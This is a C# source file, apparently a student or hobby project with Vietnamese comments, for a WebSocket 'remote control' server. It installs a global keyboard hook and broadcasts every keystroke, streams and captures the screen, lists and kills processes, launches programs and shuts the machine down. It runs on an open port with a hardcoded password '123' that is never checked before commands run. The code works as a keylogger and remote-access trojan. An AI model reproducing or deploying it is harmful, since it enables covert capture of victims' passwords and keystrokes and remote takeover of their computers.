using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms; 
using Fleck;                
using Newtonsoft.Json;      

namespace RemoteControlServer
{
    // Cấu trúc gói tin giữ nguyên
    public class WebPacket
    {
        public string type { get; set; }      
        public string payload { get; set; }   
        public string command { get; set; }   
        public string param { get; set; }     
    }

    class Program
    {
        // [FIX 1] Thêm đối tượng Lock để đồng bộ hóa danh sách Socket
        private static readonly object _socketLock = new object();
        static List<IWebSocketConnection> allSockets = new List<IWebSocketConnection>();
        
        static bool isStreaming = false;
        static string SERVER_PASSWORD = "123";

        static void Main(string[] args)
        {
            Console.OutputEncoding = Encoding.UTF8;
            Console.Title = "RCS Agent Core - Port 8181";

            // --- 1. KHỞI CHẠY KEYLOGGER ---
            // [FIX 2] Chạy Hook ngay trên luồng Main hoặc luồng riêng có Application.Run()
            // Ở đây ta tận dụng việc Main có Application.Run() ở cuối, nên ta cài Hook trước đó.
            KeyLoggerService.StartHook((key) => {
                BroadcastJson("LOG", $"[Keylogger] {key}");
            });
            Console.WriteLine("[System] Keylogger Service: Active");

            // --- 2. KHỞI TẠO WEBSOCKET SERVER ---
            var server = new WebSocketServer("ws://0.0.0.0:8181");
            server.Start(socket =>
            {
                socket.OnOpen = () => {
                    Console.WriteLine(">> Client kết nối!");
                    // [FIX 1] Lock khi thêm socket
                    lock (_socketLock) { allSockets.Add(socket); }
                };
                socket.OnClose = () => {
                    Console.WriteLine(">> Client ngắt kết nối!");
                    // [FIX 1] Lock khi xóa socket
                    lock (_socketLock) 
                    { 
                        allSockets.Remove(socket);
                        if(allSockets.Count == 0) isStreaming = false;
                    }
                };
                socket.OnMessage = message => HandleClientCommand(socket, message);
            });

            Console.WriteLine(">> Server đang chạy tại ws://0.0.0.0:8181");
            
            // --- 3. LUỒNG STREAM VIDEO ---
            Task.Factory.StartNew(ScreenStreamLoop, TaskCreationOptions.LongRunning);

            // Giữ ứng dụng chạy và duy trì Message Loop cho Keylogger Hook
            Application.Run(); 
            
            // Khi App đóng thì gỡ Hook
            KeyLoggerService.StopHook();
        }

        // Gửi tin nhắn cho tất cả (Broadcast) - Thread Safe
        static void BroadcastJson(string type, object payload)
        {
            var json = JsonConvert.SerializeObject(new { type = type, payload = payload });
            
            // [FIX 1] Lock danh sách trước khi duyệt để tránh crash
            lock (_socketLock)
            {
                foreach (var socket in allSockets)
                {
                    if (socket.IsAvailable) socket.Send(json);
                }
            }
        }

        // Gửi cho 1 Client
        static void SendJson(IWebSocketConnection socket, string type, object payload)
        {
            if (socket.IsAvailable)
            {
                var json = JsonConvert.SerializeObject(new { type = type, payload = payload });
                socket.Send(json);
            }
        }

        static void HandleClientCommand(IWebSocketConnection socket, string jsonMessage)
        {
            try
            {
                var packet = JsonConvert.DeserializeObject<WebPacket>(jsonMessage);
                
                if (packet.type == "AUTH")
                {
                    if (packet.payload == SERVER_PASSWORD) {
                        SendJson(socket, "AUTH_RESULT", "OK");
                        Console.WriteLine($"-> Login OK");
                    } else {
                        SendJson(socket, "AUTH_RESULT", "FAIL");
                    }
                    return;
                }

                if(!string.IsNullOrEmpty(packet.command))
                {
                    Console.WriteLine($"[CMD]: {packet.command} | {packet.param}");
                    
                    switch (packet.command)
                    {
                        case "START_STREAM": 
                            isStreaming = true; 
                            SendJson(socket, "LOG", "Đã bắt đầu Stream Video");
                            break;
                        
                        case "STOP_STREAM": 
                            isStreaming = false; 
                            SendJson(socket, "LOG", "Đã dừng Stream");
                            break;

                        case "CAPTURE_SCREEN":
                            byte[] imgBytes = GetScreenShot(85L);
                            if (imgBytes != null) {
                                string base64Img = Convert.ToBase64String(imgBytes);
                                SendJson(socket, "SCREEN_CAPTURE", base64Img);
                            }
                            break;

                        case "GET_APPS": 
                            var appList = Process.GetProcesses()
                                .Where(p => !string.IsNullOrEmpty(p.MainWindowTitle))
                                .Select(p => new {
                                    id = p.Id,
                                    name = p.ProcessName,
                                    title = p.MainWindowTitle
                                }).ToList();
                            SendJson(socket, "APP_LIST", appList);
                            break;

                        case "GET_PROCESS": 
                            var procList = Process.GetProcesses().Select(p => new {
                                id = p.Id,
                                name = p.ProcessName,
                                memory = (p.WorkingSet64 / 1024 / 1024) + " MB"
                            }).OrderByDescending(p => p.id).ToList();
                            SendJson(socket, "PROCESS_LIST", procList);
                            break;

                        case "KILL":
                            try {
                                Process.GetProcessById(int.Parse(packet.param)).Kill();
                                SendJson(socket, "LOG", $"Đã diệt ID {packet.param}");
                            } catch {
                                SendJson(socket, "LOG", $"Lỗi: Không thể diệt ID {packet.param}");
                            }
                            break;
                        
                        case "START_APP":
                            try {
                                Process.Start(new ProcessStartInfo { FileName = packet.param, UseShellExecute = true }); 
                                SendJson(socket, "LOG", $"Đã mở: {packet.param}");
                            } catch (Exception ex) {
                                SendJson(socket, "LOG", "Lỗi mở app: " + ex.Message);
                            }
                            break;

                        case "SHUTDOWN": Process.Start("shutdown", "/s /t 5"); break;
                        case "RESTART": Process.Start("shutdown", "/r /t 5"); break;
                    }
                }
            }
            catch (Exception ex) { Console.WriteLine("Lỗi Handle: " + ex.Message); }
        }

        static byte[] GetScreenShot(long quality)
        {
            try
            {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }
                    using (MemoryStream ms = new MemoryStream())
                    {
                        ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
                        EncoderParameters myEncoderParameters = new EncoderParameters(1);
                        myEncoderParameters.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
                        bitmap.Save(ms, jpgEncoder, myEncoderParameters);
                        return ms.ToArray();
                    }
                }
            }
            catch { return null; }
        }

        static void ScreenStreamLoop()
        {
            while (true)
            {
                // [FIX 1] Kiểm tra số lượng client an toàn với Lock
                bool hasClients = false;
                lock(_socketLock) { hasClients = allSockets.Count > 0; }

                if (isStreaming && hasClients)
                {
                    byte[] frame = GetScreenShot(40L); 
                    
                    if (frame != null)
                    {
                        // [FIX 1] Gửi Binary an toàn
                        lock (_socketLock)
                        {
                            foreach (var socket in allSockets)
                            {
                                if(socket.IsAvailable) socket.Send(frame);
                            }
                        }
                    }
                    Thread.Sleep(60); 
                }
                else
                {
                    Thread.Sleep(500);
                }
            }
        }

        static ImageCodecInfo GetEncoder(ImageFormat format)
        {
            return ImageCodecInfo.GetImageEncoders().FirstOrDefault(codec => codec.FormatID == format.Guid);
        }
    }

    // --- CLASS KEYLOGGER ---
    public class KeyLoggerService
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static Action<string> _callback; 

        public static void StartHook(Action<string> callback)
        {
            _callback = callback;
            // [UPDATE] Cài hook vào luồng hiện tại (Main Thread)
            _hookID = SetHook(_proc);
        }

        public static void StopHook()
        {
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string key = ((Keys)vkCode).ToString();
                if (_callback != null) _callback(key);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
    }
}